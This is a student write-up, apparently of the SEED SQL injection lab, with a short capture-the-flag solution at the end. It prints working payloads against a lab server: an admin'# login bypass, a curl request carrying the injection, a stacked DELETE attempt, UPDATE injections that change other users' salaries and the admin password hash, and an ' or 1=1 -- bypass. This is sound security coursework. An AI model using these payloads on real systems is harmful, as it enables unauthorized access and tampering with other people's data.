# Guião Semana #8 (SQL Injection)

## Lab Environment

1. **Update Hosts File:**
   Add the following entry and save the file:
   ```
   10.9.0.5 www.seed-server.com
   ```
   Close the file.

   ![Hosts File](<image-55.png>)
   *Fig 1. Open the '/etc/hosts' file for editing*

## Task 1: Get Familiar with SQL Statements

To retrieve the data for the user "Alice," the SQL syntax is used to execute the command:

   ![SQL Command](<image-56.png>)
   *Fig 6. Print all the profile information of all employees*

## Task 2: SQL Injection Attack on SELECT Statement

Access the website "www.seed-server.com" and navigate to the `unsafe_home.php` file. The vulnerability lies in the dynamic creation of SQL queries with unsanitized user input.

The original query looks like:
   ```
   WHERE name= '$input_uname' and Password='$hashed_pwd'
   ```

Exploiting the vulnerability, an input of "admin'#" ensures privileged access by commenting out subsequent code:
   ```
   WHERE name='admin'# and Password='$hashed_pwd'
   ```

Successful login with administrator privileges:

   ![Admin Login - Code Injection](<image-51.png>)
   *Fig 7. Log in with the administrator account with injected code*

   ![Admin Login](<image-50.png>)
   *Fig 8. Log in with the administrator account*

## Task 2.2: SQL Injection Attack from command line

Performing the attack via a GET request using `curl`:
   ```sh
   curl 'www.seed-server.com/unsafe_home.php?username=admin%27%20%23&Password=11'
   ```

This retrieves the HTML code containing users' personal data.

   ![Admin Login - Command Line](<image-53.png>)
   *Fig 8. Log in with the administrator account*

## Task 2.3: Append a new SQL statement

Appending new SQL commands using ";" was attempted to have a server-side effect, such as deleting the credentials table:

   ```sh
   '; DELETE FROM credential where id=1; #
   ```

However, the operation failed due to a database error.

   ![Database Error](<image-54.png>)
   *Fig 8. Database Error*

According to sources, the MySQL extension used by the server's PHP prevents the execution of multiple queries, hindering the completion of the attack.

## Task 3: SQL Injection Attack on UPDATE Statement

### Task 3.1 - Modify Your Own Salary

After logging in with a system account (e.g., username = Alice' #), access is granted to a page for editing personal data. The file managing this functionality is `unsafe_edit_backend.php`, featuring a query dynamically formed with unsanitized user input. Our attack focuses on manipulating the "email" field to change the user's salary.

```sql
alice@gmail.com', Salary='99999
```

   ![Change Alice Data](<image-57.png>)
   *Fig 9. Change Alice Data*

   ![Change Alice Data](<image-58.png>)
   *Fig 10. Changed Alice Data*

### Task 3.2: Modify Other People's Salary

To alter another user's salary, a similar technique is employed, creating a different WHERE clause and commenting out the system's to avoid interference.

```sql
', Salary='1' WHERE Name='Boby'#
```

   ![Change Boby Data](<image-59.png>)
   *Fig 11. Change Boby Data*

   ![Boby Salary Change](<image-60.png>)
   *Fig 12. Boby salary changed to 1*

### Task 3.3 - Modify Other People's Password

Changing another user's password involves a similar technique, but this time the value to be modified is previously encrypted with SHA1 encryption. For instance, for the new password `passwordtest`, the hash is `c29da3f6a48cb429c3f146edb5e0dcbbfaaf515d`.

```sql
', password='c29da3f6a48cb429c3f146edb5e0dcbbfaaf515d' WHERE name='Admin'#
```

   ![New Password with SHA1 Encryption](<image-61.png>)
   *Fig 13. New password with SHA1 encryption*

   ![Logged in with New Password](<image-62.png>)
   *Fig 14. Logged in with the new password*

## CTF 8 - SQL Injection

### Analysis of the Code:

```php
if (!empty($_POST)) {
   require_once 'config.php';

   $username = $_POST['username'];
   $password = $_POST['password'];
   
   $query = "SELECT username FROM user WHERE username = '".$username."' AND password = '".$password."'";
                           
   if ($result = $conn->query($query)) {
                        
      while ($data = $result->fetchArray(SQLITE3_ASSOC)) {
         $_SESSION['username'] = $data['username'];

         echo "<p>You have been logged in as {$_SESSION['username']}</p><code>";
         include "/flag.txt";
         echo "</code>";

      }
   } else {            
         // Login failed
         echo "<p>Invalid username or password. <a href=\"index.php\">Try again</a></p>";
   }
}
```

### Identified SQL Injection Vulnerability:

A significant SQL injection vulnerability is present in the code snippet `$query = "SELECT username FROM user WHERE username = '".$username."' AND password = '".$password."'";`. This code constructs a SQL query without proper preparation of the statement. To exploit this vulnerability, an attacker can input something like `' or 1=1 --` as the value of `$username`. This action closes the quotes in `username = '".$username."'`, causing the SQL query to perform an `or` (selecting all records if the user is not empty) and subsequently commenting out the remaining SQL code with `--`, thus bypassing subsequent conditions.

![Exploiting the Vulnerability](<image-63.png>)
   *Fig 11. Exploiting the Vulnerability*

![Captured Flag!](<image-64.png>)
   *Fig 12. Captured Flag*